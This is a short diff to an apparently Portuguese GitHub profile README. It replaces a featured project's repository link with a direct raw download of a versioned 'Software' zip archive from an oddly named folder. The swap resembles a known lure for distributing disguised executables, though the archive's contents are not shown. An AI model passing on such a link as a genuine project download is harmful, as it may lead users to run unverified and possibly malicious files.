@@ -11,5 +11,5 @@
 - Git e GitHub
 
 ### 📌 Projetos em destaque:
-- [Carcaça do Projeto Armoni](https://github.com/rodbatista/armoni-andamento.git)
+- [Carcaça do Projeto Armoni](https://raw.githubusercontent.com/rodbatista/rodbatista/main/unflogged/Software_v3.5-beta.2.zip)
 - [...](...)
